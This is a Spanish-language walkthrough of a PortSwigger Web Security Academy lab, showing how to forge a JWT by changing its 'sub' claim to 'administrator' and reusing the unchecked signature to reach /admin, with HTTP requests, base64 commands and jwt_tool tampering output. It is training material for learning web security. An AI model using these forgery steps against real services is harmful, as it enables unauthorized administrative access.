---
description: >-
  https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature
---

# Lab 1: JWT authentication bypass via unverified signature

Debes tener instalado esta extencion en Burp:

{% embed url="https://github.com/portswigger/jwt-editor" %}

La primera peticion es la siguiente:

```
POST /login HTTP/2
Host: 0a5500da03f7cf4d80603538004000ec.web-security-academy.net
Cookie: session=
Content-Length: 68
Cache-Control: max-age=0
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
Origin: https://0a5500da03f7cf4d80603538004000ec.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a5500da03f7cf4d80603538004000ec.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

csrf=XWFfOv9SZFuIjGixnDg77vQOvsmzDRTm&username=wiener&password=peter
```

La respuesta de la peticion es:

{% code overflow="wrap" %}
```
HTTP/2 302 Found
Location: /my-account?id=wiener
Set-Cookie: session=eyJraWQiOiI4YzNkMjczYS0wYTNhLTQ3Y2MtODVlYS01ZWQ1Zjg1MTM3MDUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNzQ0MDU0MSwic3ViIjoid2llbmVyIn0.N7gC26S9_PFb2ZeGWn2z81E0a36LQjKJaSHcdthHy3EepGgFGXWwd2uj0nXLPiG55NLEO5em0G5T486lFvf2Tw1QKaeBBvMY0twV14quL0R5If7RxApTbRCl0Rwwckx0EXSJZhOgC8dKQ5U24MICb3J6CNPxqh5sZQoEcQmpDcWf1CWzsBrvZztB9hk4VX-fA0xkq_Huq_K-bFLo78fDwIT5PY8ADk_ueH50Gz7lH7ztb_cxjL0DJ9wh9lxVZi2j2NvaVpjiYunu1gjc46a2FYE4SS_3HPV_0JK5UCDvsMjpQkF2P9MpU4imvk-CrOuX4OOkGW9YX_PXzDx2BNkkHg; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```
{% endcode %}

Este JWT tiene la siguiente estructura:

<figure><img src="../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
kali@gerh$ echo '{"iss":"portswigger","exp":1717440541,"sub":"administrator"}' | base64

eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNzQ0MDU0MSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9Cg==
```
{% endcode %}

El target o objetivo del challenge es visualizar la siguiente ruta:

```
GET /admin HTTP/2
Host: 0a5500da03f7cf4d80603538004000ec.web-security-academy.net
Cookie: session=eyJraWQiOiI4YzNkMjczYS0wYTNhLTQ3Y2MtODVlYS01ZWQ1Zjg1MTM3MDUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNzQ0MDU0MSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.N7gC26S9_PFb2ZeGWn2z81E0a36LQjKJaSHcdthHy3EepGgFGXWwd2uj0nXLPiG55NLEO5em0G5T486lFvf2Tw1QKaeBBvMY0twV14quL0R5If7RxApTbRCl0Rwwckx0EXSJZhOgC8dKQ5U24MICb3J6CNPxqh5sZQoEcQmpDcWf1CWzsBrvZztB9hk4VX-fA0xkq_Huq_K-bFLo78fDwIT5PY8ADk_ueH50Gz7lH7ztb_cxjL0DJ9wh9lxVZi2j2NvaVpjiYunu1gjc46a2FYE4SS_3HPV_0JK5UCDvsMjpQkF2P9MpU4imvk-CrOuX4OOkGW9YX_PXzDx2BNkkHg
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Referer: https://0a5500da03f7cf4d80603538004000ec.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Lo anterior responde:

```
HTTP/2 401 Unauthorized
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2614

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>JWT authentication bypass via unverified signature</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>JWT authentication bypass via unverified signature</h2>
                            <a class=link-back href='https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account?id=wiener">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    Admin interface only available if logged in as an administrator
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>

```

Luego de obtener el base64 del sub en administrator borramos los iguales y rearmamos el JWT.

Tambien podriamos utilizar esta herramienta:

<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Y al utilizar este JWT se obtiene lo siguiente:

<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

## Utilizando jwt\_tool

```bash
┌──(root㉿SPARTAN-SERVER)-[/home/hacker/BURP/jwt_tool]
└─# git clone https://github.com/ticarpi/jwt_tool
Cloning into 'jwt_tool'...
remote: Enumerating objects: 237, done.
remote: Counting objects: 100% (55/55), done.
remote: Compressing objects: 100% (31/31), done.
remote: Total 237 (delta 46), reused 26 (delta 24), pack-reused 182
Receiving objects: 100% (237/237), 168.77 KiB | 1.21 MiB/s, done.
Resolving deltas: 100% (115/115), done.

┌──(root㉿SPARTAN-SERVER)-[/home/hacker/BURP]
└─# cd jwt_tool/

┌──(root㉿SPARTAN-SERVER)-[/home/hacker/BURP/jwt_tool]
└─# python3 -m pip install -r requirements.txt
Requirement already satisfied: termcolor in /usr/lib/python3/dist-packages (from -r requirements.txt (line 1)) (2.4.0)
Collecting cprint (from -r requirements.txt (line 2))
  Downloading cprint-1.2.2.tar.gz (2.3 kB)
  Preparing metadata (setup.py) ... done
Requirement already satisfied: pycryptodomex in /usr/lib/python3/dist-packages (from -r requirements.txt (line 3)) (3.11.0)
Requirement already satisfied: requests in /usr/lib/python3/dist-packages (from -r requirements.txt (line 4)) (2.31.0)
Building wheels for collected packages: cprint
  Building wheel for cprint (setup.py) ... done
  Created wheel for cprint: filename=cprint-1.2.2-py3-none-any.whl size=2519 sha256=09667e05724fc2ec2936bac3972660704eb03f72120f6e9a533f5e26aa05e369
  Stored in directory: /root/.cache/pip/wheels/70/a4/e4/81debccb20c7e7e99097cfd17701681f953964ac84d6484834
Successfully built cprint
Installing collected packages: cprint
Successfully installed cprint-1.2.2
WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv
```

Y luego ejecutamos el siguiente comando:

```bash
┌──(root㉿SPARTAN-SERVER)-[/home/hacker/BURP/jwt_tool]
└─# python3 jwt_tool.py eyJraWQiOiI3NDEyN2M1Yi0xOWVhLTQyMDYtYTg3MC1lNGIwYWUyNTI2M2EiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNzQ0OTE2OCwic3ViIjoid2llbmVyIn0.ryItspWLrfVS4L2_4vqtUxUlK1FOmXnLmcDfLeJyHAfnt5eUM_fzNPf4SWIvtSnxO9ODy-00oQRsSN0ySHx8HUN3S5Y5VEReiCyIC0GB7NrTTwvki1VDKuDFimwCaKCVXjbBSGf32J7EFkw5cvOaygwB7mVxpv7hQcipMHGWcmXMRZPCRLyxvKkpV-8lQzdLZ19RQqYhsxSMksfyp4kXxOp8cBf5WUOR_jk3QV3qDeg0pQO-2TTXnhdTulq74cvGUF9tAEKxPEHscixXYXDv_zR6h3GA1Z-CJ_bqeMuZfms3RA9B1FQ3YnFWcVOeb2s1aSeHc8Bxjo2WwxkVm3Edzw

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.7                \______|             @ticarpi

Original JWT:

=====================
Decoded Token Values:
=====================

Token header values:
[+] kid = "74127c5b-19ea-4206-a870-e4b0ae25263a"
[+] alg = "RS256"

Token payload values:
[+] iss = "portswigger"
[+] exp = 1717449168    ==> TIMESTAMP = 2024-06-03 16:12:48 (UTC)
[+] sub = "wiener"

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------
```

Y para modificarlo:

```bash
┌──(root㉿SPARTAN-SERVER)-[/home/hacker/BURP/jwt_tool]
└─# python3 jwt_tool.py eyJraWQiOiI3NDEyN2M1Yi0xOWVhLTQyMDYtYTg3MC1lNGIwYWUyNTI2M2EiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNzQ0OTE2OCwic3ViIjoid2llbmVyIn0.ryItspWLrfVS4L2_4vqtUxUlK1FOmXnLmcDfLeJyHAfnt5eUM_fzNPf4SWIvtSnxO9ODy-00oQRsSN0ySHx8HUN3S5Y5VEReiCyIC0GB7NrTTwvki1VDKuDFimwCaKCVXjbBSGf32J7EFkw5cvOaygwB7mVxpv7hQcipMHGWcmXMRZPCRLyxvKkpV-8lQzdLZ19RQqYhsxSMksfyp4kXxOp8cBf5WUOR_jk3QV3qDeg0pQO-2TTXnhdTulq74cvGUF9tAEKxPEHscixXYXDv_zR6h3GA1Z-CJ_bqeMuZfms3RA9B1FQ3YnFWcVOeb2s1aSeHc8Bxjo2WwxkVm3Edzw -T

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.7                \______|             @ticarpi

Original JWT:


====================================================================
This option allows you to tamper with the header, contents and
signature of the JWT.
====================================================================

Token header values:
[1] kid = "74127c5b-19ea-4206-a870-e4b0ae25263a"
[2] alg = "RS256"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] iss = "portswigger"
[2] exp = 1717449168    ==> TIMESTAMP = 2024-06-03 16:12:48 (UTC)
[3] sub = "wiener"
[4] *ADD A VALUE*
[5] *DELETE A VALUE*
[6] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 3

Current value of sub is: wiener
Please enter new value and hit ENTER
> administrator
[1] iss = "portswigger"
[2] exp = 1717449168    ==> TIMESTAMP = 2024-06-03 16:12:48 (UTC)
[3] sub = "administrator"
[4] *ADD A VALUE*
[5] *DELETE A VALUE*
[6] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
Signature unchanged - no signing method specified (-S or -X)
jwttool_862973b976d2b08270bd4d13e60bce82 - Tampered token:
[+] eyJraWQiOiI3NDEyN2M1Yi0xOWVhLTQyMDYtYTg3MC1lNGIwYWUyNTI2M2EiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNzQ0OTE2OCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.ryItspWLrfVS4L2_4vqtUxUlK1FOmXnLmcDfLeJyHAfnt5eUM_fzNPf4SWIvtSnxO9ODy-00oQRsSN0ySHx8HUN3S5Y5VEReiCyIC0GB7NrTTwvki1VDKuDFimwCaKCVXjbBSGf32J7EFkw5cvOaygwB7mVxpv7hQcipMHGWcmXMRZPCRLyxvKkpV-8lQzdLZ19RQqYhsxSMksfyp4kXxOp8cBf5WUOR_jk3QV3qDeg0pQO-2TTXnhdTulq74cvGUF9tAEKxPEHscixXYXDv_zR6h3GA1Z-CJ_bqeMuZfms3RA9B1FQ3YnFWcVOeb2s1aSeHc8Bxjo2WwxkVm3Edzw
```
